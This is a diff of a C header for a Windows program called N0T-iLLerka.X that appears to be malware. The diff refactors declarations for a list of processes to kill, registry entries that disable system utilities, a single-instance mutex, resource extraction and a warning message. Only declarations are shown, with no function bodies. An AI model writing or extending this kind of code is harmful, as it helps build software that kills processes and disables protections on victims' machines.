@@ -1,11 +1,6 @@
 //// N0T-iLLerka.h : N0T-iLLerka.X's main Header File ///////////////////////////////////////////////////////////////////////////////////////////////
 #pragma once
 
-// Temp C&P -ing
-#if defined(_CONSOLE)
-
-#endif // _CONSOLE
-
 //// Compiler/Linker ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #pragma comment(linker,"\"/manifestdependency:type='win32' \
 name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
@@ -41,58 +36,53 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #define HKLM 0x1
 #define HKCU 0x2
 
-// Synchronization Macros //
-#define szHOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv:/host.Proc(running)"
-#define szHOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv:/host.Proc(running)"
-#define nSEMAPHORE 2
-
 // Utilitie Macros //
 #define nMIN_RS_LEN 0x8
 #define nMAX_RS_LEN 0x10
 #define nMAX_BUFFER_SIZE 0x2000000
+#define szHOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X[.niX]:Argv:/host.Proc(running)"
 
 //// Wrapper Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #define nRNG_RAN(nMin, nMax) (nMin + (fnCryptGenRandomNumber() % ((nMax - nMin) + 1)))
 #if DEBUG_MSG == TRUE
-	#if defined(_WINDOWS)
-		#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...) fnErrorHandlerW(lpText, lpCaption, lpFunction, uType, __VA_ARGS__)
-	#elif defined(_CONSOLE)
-		#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...)
-	#endif // _WINDOWS || _CONSOLE
+	#define fnMESSAGEHANDLERW(lpCaption, lpText, lpFunction, uType, ...) fnMessageHandlerW(lpCaption, lpText, lpFunction, uType, __VA_ARGS__)
 #else
-	#define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...)
+	#define fnMESSAGEHANDLERW(lpCaption, lpText, lpFunction, uType, ...)
 #endif // DEBUG_MSG
 
-//// Arrays/Sizes ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-extern const WCHAR szCharSet[];
-extern const SIZE_T clCharSet;
+//// Structures/Typedefinitions /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+typedef struct _REGLOAD {
+	HKEY    hKeyHK;
+	LPCWSTR lpSubKey;
+	BOOL    bWow32;
+	LPCWSTR lpValueName;
+	DWORD   dwType;
+	DWORD   dwValue;
+} REGLOAD;
 
-extern LPCWSTR szKillProcs[];
-extern const SIZE_T clKillProcs;
+//// Arrays/Sizes ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+extern const LPCWSTR szWarningMSG;
 
 extern WCHAR szCd[MAX_PATH];
 extern WCHAR szMfn[MAX_PATH];
 
-#if defined(_CONSOLE)
-extern const WCHAR szN0TiLLerkaX[];
-#endif // _CONSOLE
+extern const WCHAR szCharSet[];
+extern const SIZE_T culCharSet;
+
+extern LPCWSTR szKillProcs[];
+extern const SIZE_T culKillProcs;
+
+extern const REGLOAD rlDisableKeys[];
+extern const SIZE_T culDisableKeys;
 
 //// Function Declarations //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-// DebugConsole Functions //
-#if defined(_CONSOLE)
-BOOL fnPrintConsoleNiXW(VOID);
-DWORD WINAPI thPrintConsoleTitleW(
-	_In_ LPVOID lpParam
-);
-#endif // _CONSOLE
-
 // ErrorHandling Function //
 #if DEBUG_MSG == TRUE
-	VOID fnErrorHandlerW(
-		_In_opt_ LPCWSTR lpText,
+	VOID fnMessageHandlerW(
 		_In_opt_ LPCWSTR lpCaption,
-		_In_     LPCWSTR lpFunction,
+		_In_opt_ LPCWSTR lpText,
+		_In_opt_ LPCWSTR lpFunction,
 		_In_opt_ UINT    uType,
 		_In_opt_         ...
 	);
@@ -137,23 +127,29 @@ BOOL fnCreateRegistryKeyW(
 BOOL fnCheckRegistryKeyW(
 	_In_ LPCWSTR lpSubKey
 );
-#if DISABLE_PROTECTIONS == FALSE
+#if PROTECTIONS == TRUE
 	BOOL fnDisableUtilities(VOID);
 #endif // !DISABLE_PROTECTIONS
 
 // Resource Functions //
+BOOL fnExtractResourceW(
+	_In_ WORD    wResID,
+	_In_ LPCWSTR lpResType,
+	_In_ LPCWSTR lpFileName
+);
 LPVOID fnLoadResourceW(
-	_In_  WORD    resID,
+	_In_  WORD    wResID,
+	_In_  LPCWSTR lpResType,
 	_Out_ LPDWORD dwBufferSize
 );
 BOOL fnSaveResourceW(
-	_In_ LPCWSTR lpName,
+	_In_ LPCWSTR lpFileName,
 	_In_ LPVOID  lpBuffer,
 	_In_ DWORD   dwBufferSize
 );
 
 // Synchronization Functions //
-#if DISABLE_SYNCHRONIZATION == FLASE
+#if SYNCHRONIZATION == TRUE
 	BOOL fnCheckMutexW(
 		_In_ LPCWSTR lpName
 	);
